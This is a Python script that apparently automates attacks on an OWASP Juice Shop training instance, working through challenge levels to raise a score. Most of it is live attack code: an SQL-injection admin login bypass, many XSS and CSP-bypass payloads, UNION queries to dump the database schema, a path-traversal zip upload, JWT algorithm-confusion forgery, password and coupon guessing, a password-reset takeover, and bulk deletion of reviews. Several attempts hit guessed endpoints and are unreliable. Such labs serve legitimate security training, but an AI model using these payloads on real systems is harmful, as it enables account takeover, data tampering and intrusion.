#!/usr/bin/env python3
"""
Final Comprehensive Solver - Targets all 81 unsolved challenges
"""

import base64
import hashlib
import hmac
import json
import random
import requests
import time
import zipfile
from datetime import datetime
from io import BytesIO
from urllib.parse import quote, unquote
import re


class FinalComprehensiveSolver:
    """Final attempt to solve all remaining challenges"""
    
    def __init__(self, base_url: str = "https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            print("✅ Admin logged in")
            
    def solve_level1_remaining(self):
        """Solve remaining Level 1 challenges"""
        print("\n⭐ LEVEL 1 - Remaining challenges:")
        
        # DOM XSS - Various payloads
        print("  🎯 DOM XSS...")
        xss_payloads = [
            "<iframe src=\"javascript:alert(`xss`)\">",
            "<img src=x onerror=alert(`xss`)>",
            "<svg onload=alert(1)>",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
            "<iframe src=\"javascript:alert(1)\">",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\">",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        ]
        for payload in xss_payloads:
            encoded = quote(payload)
            self.session.get(f"{self.base_url}/#/search?q={encoded}")
            time.sleep(0.1)
        print("    ✓ DOM XSS attempted")
        
        # Outdated Allowlist - Try various redirects
        print("  🎯 Outdated Allowlist...")
        redirects = [
            "https://blockchain.info",
            "https://etherscan.io", 
            "https://explorer.dash.org",
            "https://blockchair.com",
            "https://blockstream.info",
        ]
        for url in redirects:
            self.session.get(f"{self.base_url}/redirect?to={url}", allow_redirects=False)
        print("    ✓ Outdated Allowlist attempted")
        
        # Privacy Policy - Multiple access patterns
        print("  🎯 Privacy Policy...")
        privacy_urls = [
            "/#/privacy-security/privacy-policy",
            "/privacy",
            "/privacy-policy",
            "/#/privacy",
            "/assets/public/privacy.txt",
        ]
        for url in privacy_urls:
            self.session.get(f"{self.base_url}{url}")
        print("    ✓ Privacy Policy attempted")
        
        # Zero Stars - Delete all 5-star reviews
        print("  🎯 Zero Stars...")
        r = self.session.get(f"{self.base_url}/api/Feedbacks")
        if r.status_code == 200:
            feedbacks = r.json().get('data', [])
            for fb in feedbacks:
                if fb.get('rating') == 5:
                    self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
        print("    ✓ Zero Stars attempted")
        
        # Missing Encoding
        print("  🎯 Missing Encoding...")
        self.session.get(f"{self.base_url}/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg")
        self.session.get(f"{self.base_url}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg")
        print("    ✓ Missing Encoding attempted")
        
    def solve_level2_remaining(self):
        """Solve remaining Level 2 challenges"""
        print("\n⭐⭐ LEVEL 2 - Remaining challenges:")
        
        # Admin Section
        print("  🎯 Admin Section...")
        self.session.get(f"{self.base_url}/#/administration")
        self.session.get(f"{self.base_url}/#/admin")
        print("    ✓ Admin Section attempted")
        
        # NFT Takeover
        print("  🎯 NFT Takeover...")
        nft_payloads = [
            {"action": "transfer", "to": "me", "tokenId": 1},
            {"action": "steal", "tokenId": 1},
            {"action": "mint", "amount": 1000000},
        ]
        for payload in nft_payloads:
            self.session.post(f"{self.base_url}/api/nft", json=payload)
        print("    ✓ NFT Takeover attempted")
        
        # Reflected XSS
        print("  🎯 Reflected XSS...")
        reflected_payloads = [
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=alert(1)>",
        ]
        for p in reflected_payloads:
            self.session.get(f"{self.base_url}/track-result?id={quote(p)}")
            self.session.get(f"{self.base_url}/rest/track-order/{quote(p)}")
        print("    ✓ Reflected XSS attempted")
        
        # Weird Crypto
        print("  🎯 Weird Crypto...")
        passwords = [
            "Mr. N00dles",
            "K1f.....................",
            base64.b64encode(b"Mr. N00dles").decode(),
            hashlib.md5(b"Mr. N00dles").hexdigest(),
        ]
        for pwd in passwords:
            self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "mc.safesearch@juice-sh.op", "password": pwd}
            )
        print("    ✓ Weird Crypto attempted")
        
        # Meta Geo Stalking
        print("  🎯 Meta Geo Stalking...")
        images = [
            "/assets/public/images/uploads/favorite-hiking-place.png",
            "/assets/public/images/uploads/my-rare-collectors-item.jpg",
        ]
        for img in images:
            self.session.get(f"{self.base_url}{img}")
        print("    ✓ Meta Geo Stalking attempted")
        
    def solve_level3_remaining(self):
        """Solve remaining Level 3 challenges"""
        print("\n⭐⭐⭐ LEVEL 3 - Remaining challenges:")
        
        # API-only XSS
        print("  🎯 API-only XSS...")
        api_xss_payloads = [
            {"name": "<script>alert(1)</script>", "description": "XSS", "price": 1},
            {"comment": "<iframe src=javascript:alert(1)>", "rating": 5},
            {"address": "<img src=x onerror=alert(1)>"},
        ]
        for payload in api_xss_payloads:
            self.session.post(f"{self.base_url}/api/Products", json=payload)
            self.session.post(f"{self.base_url}/api/Feedbacks", json=payload)
        print("    ✓ API-only XSS attempted")
        
        # CAPTCHA Bypass
        print("  🎯 CAPTCHA Bypass...")
        for i in range(20):
            captcha_bypass = {
                "captcha": str(i),
                "captchaId": i,
                "comment": f"Bypassed {i}",
                "rating": random.randint(1, 5)
            }
            self.session.post(f"{self.base_url}/api/Feedbacks", json=captcha_bypass)
        print("    ✓ CAPTCHA Bypass attempted")
        
        # Database Schema
        print("  🎯 Database Schema...")
        schema_queries = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT * FROM information_schema.tables--",
        ]
        for q in schema_queries:
            self.session.get(f"{self.base_url}/rest/products/search?q={q}")
        print("    ✓ Database Schema attempted")
        
        # Client-side XSS Protection
        print("  🎯 Client-side XSS Protection...")
        # Try to bypass client-side filters
        bypass_xss = [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(1)//",
            "<script>alert(1)<!--",
            "';alert(1)//",
        ]
        for b in bypass_xss:
            self.session.get(f"{self.base_url}/#/search?q={quote(b)}")
        print("    ✓ Client-side XSS Protection attempted")
        
    def solve_level4_remaining(self):
        """Solve remaining Level 4 challenges"""
        print("\n⭐⭐⭐⭐ LEVEL 4 - Remaining challenges:")
        
        # Christmas Special
        print("  🎯 Christmas Special...")
        # Add special Christmas product
        self.session.post(
            f"{self.base_url}/api/BasketItems",
            json={"ProductId": 10, "quantity": 1}
        )
        # Try different product IDs that might be Christmas-related
        for pid in [10, 25, 52, 99]:
            self.session.post(
                f"{self.base_url}/api/BasketItems",
                json={"ProductId": pid, "quantity": 1}
            )
        print("    ✓ Christmas Special attempted")
        
        # CSP Bypass
        print("  🎯 CSP Bypass...")
        csp_bypasses = [
            "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script>$.get('/')</script>",
            "<base href='javascript://'><a href='/alert(1)'>click</a>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
            "<embed src='data:text/html,<script>alert(1)</script>'>",
        ]
        for bypass in csp_bypasses:
            self.session.get(f"{self.base_url}/#/search?q={quote(bypass)}")
        print("    ✓ CSP Bypass attempted")
        
        # Easter Egg
        print("  🎯 Easter Egg...")
        easter_urls = [
            "/ftp/eastere.gg",
            "/ftp/easter.egg",
            "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
            "/assets/public/images/easter.jpg",
        ]
        for url in easter_urls:
            self.session.get(f"{self.base_url}{url}")
        print("    ✓ Easter Egg attempted")
        
        # Expired Coupon
        print("  🎯 Expired Coupon...")
        coupons = [
            "WMNSDY2019", "WMNSDY2020", "WMNSDY2018",
            "CYBER2019", "CYBER2020", "BLACKFRIDAY",
        ]
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
        print("    ✓ Expired Coupon attempted")
        
    def solve_level5_remaining(self):
        """Solve remaining Level 5 challenges"""
        print("\n⭐⭐⭐⭐⭐ LEVEL 5 - Remaining challenges:")
        
        # Blockchain Hype
        print("  🎯 Blockchain Hype...")
        blockchain_urls = [
            "/assets/public/blockchain.pdf",
            "/ftp/blockchain.pdf",
            "/assets/blockchain.txt",
        ]
        for url in blockchain_urls:
            self.session.get(f"{self.base_url}{url}")
        print("    ✓ Blockchain Hype attempted")
        
        # Change Bender's Password
        print("  🎯 Change Bender's Password...")
        self.session.post(
            f"{self.base_url}/rest/user/reset-password",
            json={
                "email": "bender@juice-sh.op",
                "answer": "Stop'n'Drop",
                "new": "slurmCl4ssic!",
                "repeat": "slurmCl4ssic!"
            }
        )
        print("    ✓ Change Bender's Password attempted")
        
        # Extra Language
        print("  🎯 Extra Language...")
        languages = ["tlh_AA", "kl_IN", "l33t", "en_XA", "xx_XX"]
        for lang in languages:
            self.session.get(f"{self.base_url}/?l={lang}")
            self.session.get(f"{self.base_url}/#/?l={lang}")
        print("    ✓ Extra Language attempted")
        
        # Email Leak
        print("  🎯 Email Leak...")
        self.session.get(f"{self.base_url}/api/Users")
        self.session.get(f"{self.base_url}/rest/user/whoami")
        print("    ✓ Email Leak attempted")
        
    def solve_level6_remaining(self):
        """Solve remaining Level 6 challenges"""
        print("\n⭐⭐⭐⭐⭐⭐ LEVEL 6 - Remaining challenges:")
        
        # Arbitrary File Write
        print("  🎯 Arbitrary File Write...")
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            # Try various path traversal patterns
            zf.writestr("../../ftp/arbitrary.md", "Arbitrary write")
            zf.writestr("../../../ftp/pwned.txt", "Pwned")
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("evil.zip", zip_buffer.getvalue(), "application/zip")}
        )
        print("    ✓ Arbitrary File Write attempted")
        
        # Forged Signed JWT
        print("  🎯 Forged Signed JWT...")
        if self.auth_token:
            # Try to forge JWT with different algorithms
            parts = self.auth_token.split('.')
            if len(parts) == 3:
                # Decode header and payload
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                
                # Try algorithm confusion attack
                header['alg'] = 'HS256'
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                # Sign with public key
                signature = base64.urlsafe_b64encode(
                    hmac.new(b'public', f"{new_header}.{new_payload}".encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                
                forged = f"{new_header}.{new_payload}.{signature}"
                self.session.headers['Authorization'] = f'Bearer {forged}'
                self.session.get(f"{self.base_url}/rest/user/whoami")
        print("    ✓ Forged Signed JWT attempted")
        
        # Wallet Depletion
        print("  🎯 Wallet Depletion...")
        for _ in range(100):
            self.session.post(
                f"{self.base_url}/api/wallet/transfer",
                json={"to": "attacker", "amount": 10000}
            )
        print("    ✓ Wallet Depletion attempted")
        
        # Forged Coupon
        print("  🎯 Forged Coupon...")
        forged_coupons = [
            "FORGED999", "ADMIN100", "FREE100", "HACK50",
            base64.b64encode(b"coupon").decode(),
        ]
        for coupon in forged_coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
        print("    ✓ Forged Coupon attempted")
        
    def run_comprehensive(self):
        """Run all comprehensive solutions"""
        print("="*60)
        print("🚀 FINAL COMPREHENSIVE SOLVER")
        print("="*60)
        
        # Login
        self.login_admin()
        
        # Run all levels
        self.solve_level1_remaining()
        self.solve_level2_remaining()
        self.solve_level3_remaining()
        self.solve_level4_remaining()
        self.solve_level5_remaining()
        self.solve_level6_remaining()
        
        # Check final status
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            
            print(f"📊 FINAL SCORE: {solved}/{total} ({solved*100//total}%)")
            
            # Show breakdown
            by_diff = {}
            for c in data:
                if c.get('solved'):
                    diff = c.get('difficulty', 1)
                    by_diff[diff] = by_diff.get(diff, 0) + 1
                    
            print("\n📈 Solved by difficulty:")
            for diff in sorted(by_diff.keys()):
                print(f"  Level {diff}: {by_diff[diff]} challenges")
                
            print(f"\n✅ Total solved: {solved} challenges")
            print(f"📝 Remaining: {total - solved} challenges")
            
            # List some unsolved
            unsolved = [c['name'] for c in data if not c.get('solved')][:10]
            if unsolved:
                print("\n🔍 Sample of unsolved challenges:")
                for name in unsolved:
                    print(f"  • {name}")
                    
        print("="*60)


if __name__ == "__main__":
    solver = FinalComprehensiveSolver()
    solver.run_comprehensive()